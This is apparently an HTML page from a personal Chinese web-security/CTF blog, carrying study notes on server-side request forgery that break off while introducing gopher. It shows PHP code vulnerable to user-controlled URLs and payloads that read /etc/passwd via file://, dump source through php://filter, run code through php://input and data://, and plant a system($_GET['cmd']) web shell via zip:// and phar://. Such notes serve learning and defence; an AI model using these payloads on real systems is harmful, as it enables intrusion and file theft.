@@ -1,0 +1,840 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/atom+xml"><link rel="alternate" type="application/json" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture6.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture3.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture6.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/02/12/SSRF/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>SSRF</title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
+<link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">SSRF</h1><div class="meta"><span class="item" title="创建时间：2026-02-12 15:06:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-02-12T15:06:00+08:00">2026-02-12</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>31k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>29 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture6.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture3.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture6.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/02/12/SSRF/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~"/></span><div class="body md" itemprop="articleBody"><h1 id="ssrf"><a class="anchor" href="#ssrf">#</a> SSRF</h1>
+<p>SSRF:服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
+<p><strong>SSRF 漏洞出现的场景</strong> ：</p>
+<ul>
+<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
+<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
+<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li>
+<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
+<li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
+</ul>
+<h2 id="相关的函数"><a class="anchor" href="#相关的函数">#</a> 相关的函数</h2>
+<ol>
+<li>
+<p>file_get_contents：</p>
+<p>这个函数的本意是读取文件内容到字符串，但它也支持使用HTTP、FTP等协议读取远程资源。当开发者直接使用<code>$_GET['url']</code>这样的用户输入作为参数时，攻击者就可以构造恶意URL。</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-php"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#A65E2B;--shiki-dark:#C99076">php</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">url</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">_GET</span><span style="color:#2993a3;--shiki-dark:#5eaab5">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">url</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#2993a3;--shiki-dark:#5eaab5">]</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">echo</span><span style="color:#998418;--shiki-dark:#B8A965"> file_get_contents</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">url</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#AB5959;--shiki-dark:#CB7676">></span></span></code></pre>
+<p>在这串代码中，如果恶意传入?url=file:///etc/passwd，那么最后echo的就是/etc/passwd的文件内容，造成文件读取。</p>
+</li>
+<li>
+<p>fsockopen()：</p>
+<p>此函数用于打开一个网络Socket连接，允许与任意主机和端口进行原始的TCP通信。它比HTTP库更底层，因此可以与被防火墙保护的、非HTTP协议的内网服务（如Redis、MySQL、Memcached）直接交互。</p>
+<p>我们也可以使用该函数去模拟http请求 ：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-php"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#A65E2B;--shiki-dark:#C99076">php</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//打开连接通道</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">fp</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#998418;--shiki-dark:#B8A965">fsockopen</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">www.cnblogs.com</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">80</span><span style="color:#999999;--shiki-dark:#666666">,$</span><span style="color:#B07D48;--shiki-dark:#BD976A">errno</span><span style="color:#999999;--shiki-dark:#666666">,$</span><span style="color:#B07D48;--shiki-dark:#BD976A">errstr</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">30</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">if</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#AB5959;--shiki-dark:#CB7676">!</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">fp</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">&#123;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">    die</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">连接错误</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#AB5959;--shiki-dark:#CB7676">.</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">errstr</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">&#125;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">set_time_limit</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2F798A;--shiki-dark:#4C9A91">0</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//通道打开，模拟HTTP请求,http协议标准的换行是\r\n</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">http</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">GET / HTTP/1.1</span><span style="color:#A65E2B;--shiki-dark:#C99076">\r\n</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">http</span><span style="color:#AB5959;--shiki-dark:#CB7676">.=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">Host: www.cnblogs.com</span><span style="color:#A65E2B;--shiki-dark:#C99076">\r\n</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">http</span><span style="color:#AB5959;--shiki-dark:#CB7676">.=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">User-Agent: </span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B56959;--shiki-dark:#C98A7D">_SERVER[HTTP_USER_AGENT]</span><span style="color:#A65E2B;--shiki-dark:#C99076">\r\n</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">http</span><span style="color:#AB5959;--shiki-dark:#CB7676">.=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">Connection: Close</span><span style="color:#A65E2B;--shiki-dark:#C99076">\r\n\r\n</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//http模拟完成，发送给服务器</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">fwrite</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">fp</span><span style="color:#999999;--shiki-dark:#666666">,$</span><span style="color:#B07D48;--shiki-dark:#BD976A">http</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//接受服务器的返回结果</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">out</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">''</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">while</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#AB5959;--shiki-dark:#CB7676">!</span><span style="color:#998418;--shiki-dark:#B8A965">feof</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">fp</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">&#123;</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">    $</span><span style="color:#B07D48;--shiki-dark:#BD976A">out</span><span style="color:#AB5959;--shiki-dark:#CB7676">.=</span><span style="color:#998418;--shiki-dark:#B8A965">fread</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">fp</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">1024</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">&#125;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">echo</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">out</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">fclose</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">fp</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>HTTP/1.1 403 Forbidden Server: bfe Set-Cookie: BAIDUID=DE50CDD1B12BE7937A9C9D73E4F794FF:FG=1; Path=/; Domain=baidu.com; Max-Age=31536000 Set-Cookie: BAIDUID_BFESS=DE50CDD1B12BE7937A9C9D73E4F794FF:FG=1; Path=/; Domain=baidu.com; Max-Age=31536000; Secure; SameSite=None Date: Tue, 10 Feb 2026 07:24:59 GMT Content-Length: 0 Content-Type: text/plain; charset=utf-8 Connection: close</span></span></code></pre>
+</li>
+<li>
+<p>curl_exec()：</p>
+<p>cURL是一个非常强大且支持众多协议（如<code>HTTP</code>、<code>HTTPS</code>、<code>FTP</code>、<code>FILE</code>、<code>GOPHER</code>、<code>DICT</code>等）的库。<code>curl_exec()</code>函数执行cURL会话，如果其目标URL（通过<code>CURLOPT_URL</code>设置）由用户完全控制，攻击面会非常大。</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-php"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#A65E2B;--shiki-dark:#C99076">php</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#998418;--shiki-dark:#B8A965"> curl_init</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">curl_setopt</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#A65E2B;--shiki-dark:#C99076"> CURLOPT_URL</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">_GET</span><span style="color:#1e754f;--shiki-dark:#4d9375">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">url</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#1e754f;--shiki-dark:#4d9375">]</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> // 用户可控</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">curl_setopt</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#A65E2B;--shiki-dark:#C99076"> CURLOPT_RETURNTRANSFER</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 1</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">result</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#998418;--shiki-dark:#B8A965"> curl_exec</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">ch</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> // 发起请求</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">echo</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">result</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#AB5959;--shiki-dark:#CB7676">></span></span></code></pre>
+<p>因其支持<code>gopher</code>协议，常被用来构造攻击内网Redis、FastCGI等服务的Payload</p>
+</li>
+<li>
+<p>除此之外还有readfile()输出文件内容和fopen()打开文件或者URL</p>
+</li>
+</ol>
+<h2 id="各种协议"><a class="anchor" href="#各种协议">#</a> 各种协议</h2>
+<ol>
+<li>
+<p>file:// 本地文件协议</p>
+<p>可以用来读取本地文件，算是比较常用的一个</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://ZLARYY.com/?url=file:///etc/passwd</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://ZLARYY.com/?url=file:///C:/Windows/win.ini</span></span></code></pre>
+</li>
+<li>
+<p>php://filter</p>
+<p>这个也是十分常用的协议，具体语法为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>php://filter/动作(或者称过滤器)/resource=文件名</span></span></code></pre>
+<p>常用过滤器 ：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>// 读取PHP文件源码（base64编码）</span></span>
+<span class="line"><span>php://filter/read=convert.base64-encode/resource=index.php</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>// 读取文件（ROT13编码）</span></span>
+<span class="line"><span>php://filter/read=string.rot13/resource=config.php</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>// 读取文件（大写转换）</span></span>
+<span class="line"><span>php://filter/read=string.toupper/resource=flag.php</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>// 多重过滤器</span></span>
+<span class="line"><span>php://filter/convert.base64-encode|string.rot13/resource=admin.php</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://ZLARYY.com/?url=php://filter/read=convert.base64-encode/resource=/etc/passwd</span></span></code></pre>
+</li>
+<li>
+<p>php://input</p>
+<p>这个协议的使用需要allow_url_include=on，并且需要有写入权限或代码执行能力</p>
+<p>这是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据，当enctype等于”multipart/form-data”时php://input是无效的。</p>
+<p>php://input 可以访问请求的原始数据的只读流，<strong>将post请求的数据当作php代码执行</strong>，当传入的参数作为文件名打开时，可以将参数设为php://input,同时post写入想要执行的php代码，php执行时会将post内容当作文件内容，从而导致任意代码执行。</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://ZLARYY.com/?url=php://input</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>//POST提交：</span></span>
+<span class="line"><span>&#x3C;?php system('ls');?></span></span></code></pre>
+</li>
+<li>
+<p>data:// 数据流包含</p>
+<p>这个协议的使用也需要allow_url_include=on，其类似于php://input协议，也可以将用户的一段指定的输入流作为被包含的文件，基本语法如下：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>data://text/plain,代码内容</span></span>
+<span class="line"><span>data://text/plain;base64,base64编码的代码</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://ZLARYY.com/?url=data://text/plain,&#x3C;?php phpinfo();?></span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://ZLARYY.com/?url=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></span></code></pre>
+</li>
+<li>
+<p>zip:// 压缩包包含</p>
+<p>zip协议可以访问zip压缩包里的文件，zip协议的使用要注意只能够使用绝对路径，而不能使用相对路径。</p>
+<p>其基本语法如下：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>zip://压缩文件路径#压缩包内文件名</span></span></code></pre>
+<p>zip协议一个很大的作用在于我们可以将防护较为严格的文件上传漏洞和文件包含漏洞结合起来，最终获得远程命令执行权限。即上传含有PHP木马的zip压缩包，这样可以使用zip的文件后缀以绕过文件上传漏洞对文件后缀名的限制，然后再利用文件包含漏洞执行这一PHP木马。</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 创建恶意压缩包</span></span>
+<span class="line"><span>echo '&#x3C;?php system($_GET["cmd"]); ?>' > shell.php</span></span>
+<span class="line"><span>zip shell.zip shell.php</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 通过LFI包含压缩包中的文件</span></span>
+<span class="line"><span>http://ZLARYY.com/?url=zip:///var/www/uploads/shell.zip%23shell.php</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 执行命令</span></span>
+<span class="line"><span>http://ZLARYY.com/?urrl=zip:///var/www/uploads/shell.zip%23shell.php&#x26;cmd=ls</span></span></code></pre>
+</li>
+<li>
+<p>phar://</p>
+<p>这个就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压，基本语法：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>phar://压缩包路径/压缩包内部文件名</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 创建Phar包</span></span>
+<span class="line"><span>echo '&#x3C;?php system($_GET["cmd"]); ?>' > shell.php</span></span>
+<span class="line"><span>zip shell.phar shell.php</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 通过LFI包含</span></span>
+<span class="line"><span>http://ZLARYY.com/?url=phar://upload/shell.phar/shell.php&#x26;cmd=ls</span></span></code></pre>
+<p><strong>注：在某些文件上传题目中也可以利用该伪协议进行文件读取，可以上传一个将后缀名修改为.png的压缩包，利用 phar://协议不管后缀是什么都会当做压缩包来解压的特性</strong></p>
+</li>
+<li>
+<p><strong>Gopher</strong></p>
+<p>gopher协议是一个古老且强大的协议，可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了。</p>
+<ul>
+<li><strong>特点</strong>： 简单、无状态、基于 TCP。</li>
+<li><strong>工作方式</strong>： 客户端向服务器发起一个 TCP 连接（默认端口 70），发送一个字符串（选择器，selector），然后服务器返回相应的文本信息并关闭连接。</li>
